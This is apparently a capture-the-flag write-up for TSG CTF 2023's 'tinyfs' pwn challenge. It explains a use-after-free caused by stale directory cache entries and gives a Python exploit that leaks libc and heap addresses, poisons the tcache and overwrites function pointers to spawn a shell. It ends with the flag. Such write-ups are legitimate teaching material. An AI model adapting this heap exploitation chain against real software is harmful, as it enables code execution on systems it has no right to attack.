# TSG CTF 2023 - pwn/tinyfs

## Solution

When you command `cd <absolute path>`, the directory (`MyFolder*`) is cached using the path as the key. If the path is already cached, it will navigate to the directory without scanning the filesystem.

When `delete_item` function deletes a directory, it frees all files (`MyFile*`) that are children of the directory. This also deletes the cache entry for the directory, but not the entries for the subdirectories.

```c

void delete_item(char* name) {
    VALIDATE_NAME(name);

    for (int i = 0; i < CONTENT_MAX; i++) {
        if (pwd->folders[i] && !strcmp(pwd->folders[i]->name, name)) {
            for (int j = 0; j < CONTENT_MAX; j++) {
                if (pwd->folders[i]->files[j]) {
                    free(pwd->folders[i]->files[j]);
                }
            }
            delete_cache(pwd->folders[i]);
            pwd->folders[i] = NULL;
            puts("The folder has been deleted.");
            return;
        }
    }

    for (int i = 0; i < CONTENT_MAX; i++) {
        if (pwd->files[i] && !strcmp(pwd->files[i]->name, name)) {
            free(pwd->files[i]);
            pwd->files[i] = NULL;
            puts("The file has been deleted.");
            return;
        }
    }

    puts("The item is not found.");
}
```

Thus, we can navigate to the deleted subdirectory as follows:

```
mkdir A
cd A
touch x
mkdir B
cd /A/B/
cd /
rm /A     # x is freed
cd /A/B/
```

We can also navigate to the parent directory.

```
cd ..
```

Now we can access the freed files in the directory `A` by `cat` or `mod`. The remaining work is the same as standard heap challenges: leak libc's base address and safe-linking mask, do tcache poisoning, and rewrite some function pointers to get the shell.

## Exploit

```python
sc.after("$").sendline("mkdir A")
sc.after("$").sendline("cd A")

for i in range(8):
    sc.after("$").sendline(f"touch {i}")
    sc.after("$").sendline(f"mod {i}")
    sc.after("Write Here >").sendline("X" * 32)

sc.after("$").sendline("cd ..")
sc.after("$").sendline(f"touch x1")
sc.after("$").sendline("cd A")


sc.after("$").sendline("mkdir B")
sc.after("$").sendline("cd /A/B")
sc.after("$").sendline("cd /")
sc.after("$").sendline("rm A")
sc.after("$").sendline("cd /A/B")
sc.after("$").sendline("cd ..")

sc.after("$").sendline("ls")

# libc leak

sc.after("$ ").sendline("cat 0")

leak = sc.recv_before(b"\n$")

libc_offset = util.u2i(leak) - 0x7fb69fbf6ce0
libc_base = 0x00007fb69fa00000 + libc_offset
print(f"{libc_base=:#x}")

# heap leak

sc.after("$ ").sendline("cat 7")
leak = sc.recv_before(b"\n$")

ptr_mask = util.u2i(leak) << 12
print(f"{ptr_mask=:#x}")

sc.after("$ ").sendline("cat 5")
leak = sc.recv_before(b"\n$")

ptr_6 = util.u2i(leak) ^ (ptr_mask >> 12)
print(f"{ptr_6=:#x}")

# tcache poisoning

shift = 4

sc.after("$ ").sendline(f"mod 6")
sc.after("Write Here >").sendline(util.u64((libc_base + 0x1f6000 + 8 * shift) ^ (ptr_mask >> 12)))

for i in range(6):
    sc.after("$").sendline(f"touch y{i}")

sc.after("$").sendline(f"touch z")
sc.after("$").sendline(f"mod z")

ptrs = [0x40 + i for i in range(0x200 // 8 - 1)]

ptrs[0x15] = 0x00052f4f + libc_base
ptrs[0x1b] = 0x00153f54 + libc_base
ptrs[0x21] = 0xea953 + libc_base
ptrs[0x1d] = 0x4e8a0 + libc_base

sc.after("Write Here >").sendline(util.u64(*ptrs[shift:][:0x100 // 8 - 1]))
```

## Flag

```
TSGCTF{de1eting_fi1e5_recur5ive1y_5ave5_y0ur_1ife}
```